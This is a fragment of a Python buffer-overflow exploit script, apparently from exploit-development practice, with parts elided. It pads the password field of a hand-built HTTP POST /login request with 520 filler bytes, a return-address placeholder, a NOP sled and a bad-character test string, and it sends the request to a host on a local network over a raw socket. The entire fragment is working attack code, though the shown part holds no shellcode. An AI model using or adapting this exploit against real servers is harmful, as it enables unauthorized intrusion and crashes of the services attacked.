...
# BadChars = \x00\x0a\x0d\x25\x26\2b\x3d
...
data = "A" * 520 + "BBBB" + "\x90" * 30 + chars
siz = len(data) + 20

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.0.26\r\n"
request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
request+="Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Referer: http://192.168.0.26/login\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="Content-Length: "+str(siz)+"\r\n"
request+="Origin: http://192.168.0.26\r\n"
request+="DNT: 1\r\n"
request+="Connection: close\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="Sec-GPC: 1\r\n"
request+="\r\n"
request+="username=A&password="+str(data)

mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mysock.connect(("192.168.0.26",80))
mysock.send(request)
